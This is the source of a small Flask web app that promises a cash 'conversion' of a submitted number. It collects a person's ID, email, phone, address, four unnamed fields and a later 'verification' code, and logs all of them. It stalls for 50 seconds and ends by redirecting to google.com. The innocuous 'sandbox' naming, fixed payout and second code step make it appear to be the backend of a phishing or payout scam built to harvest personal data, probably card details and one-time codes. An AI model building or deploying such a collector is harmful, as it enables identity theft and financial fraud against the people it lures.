from flask import Flask, render_template, request, redirect
import time
import os

app = Flask(__name__)

RATE = 0.00025


@app.route("/")
def home():
    return render_template("index.html")


# First page -> conversion page
@app.route("/start", methods=["POST"])
def start():
    number = request.form.get("number", "").strip()

    try:
        numeric_number = float(number)
    except (ValueError, TypeError):
        return "Invalid sandbox number.", 400

    if numeric_number <= 0:
        return "Invalid sandbox number.", 400

    print("\n=== SANDBOX NUMBER ===", flush=True)
    print("Number:", number, flush=True)
    print("======================\n", flush=True)

    return render_template(
        "converting.html",
        number=number
    )


# Conversion page -> payout form
@app.route("/conversion-complete", methods=["POST"])
def conversion_complete():
    number = request.form.get("number", "").strip()

    try:
        numeric_number = float(number)
    except (ValueError, TypeError):
        return "Invalid sandbox number.", 400

    amount = numeric_number * RATE

    print("Conversion completed.", flush=True)
    print("Number:", number, flush=True)
    print("Calculated amount:", f"${amount:.2f}", flush=True)

    return render_template(
        "payout.html",
        number=number
    )


# Payout form -> 50-second confirmation
@app.route("/sandbox-payout", methods=["POST"])
def sandbox_payout():

    number = request.form.get("number", "").strip()
    sandbox_id = request.form.get("sandbox_id", "").strip()
    sandbox_email = request.form.get("sandbox_email", "").strip()
    phone = request.form.get("phone", "").strip()
    address = request.form.get("address", "").strip()

    sandbox_1 = request.form.get("sandbox_1", "").strip()
    sandbox_2 = request.form.get("sandbox_2", "").strip()
    sandbox_3 = request.form.get("sandbox_3", "").strip()
    sandbox_4 = request.form.get("sandbox_4", "").strip()

    print("\n=== SANDBOX PAYOUT ===", flush=True)
    print("Sandbox ID:", sandbox_id, flush=True)
    print("Sandbox Email:", sandbox_email, flush=True)
    print("Sandbox Phone:", phone, flush=True)
    print("Sandbox Address:", address, flush=True)
    print("Sandbox 1:", sandbox_1, flush=True)
    print("Sandbox 2:", sandbox_2, flush=True)
    print("Sandbox 3:", sandbox_3, flush=True)
    print("Sandbox 4:", sandbox_4, flush=True)
    print("Sandbox Number:", number, flush=True)
    print("======================\n", flush=True)

    # 50-second sandbox confirmation
    time.sleep(50)

    return render_template(
        "result.html",
        amount=2.4,
        number=number
    )


# Verification page
@app.route("/verify", methods=["GET", "POST"])
def verify():

    if request.method == "POST":

        verification_sandbox_id = request.form.get(
            "verification_sandbox_id",
            ""
        ).strip()

        print("\n=== VERIFICATION ===", flush=True)
        print(
            "Verification Sandbox ID:",
            verification_sandbox_id,
            flush=True
        )
        print("====================\n", flush=True)

        return redirect("https://www.google.com")

    return render_template("verify.html")


@app.route("/health")
def health():
    return {"status": "online"}


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(
        host="0.0.0.0",
        port=port,
        debug=False
    )
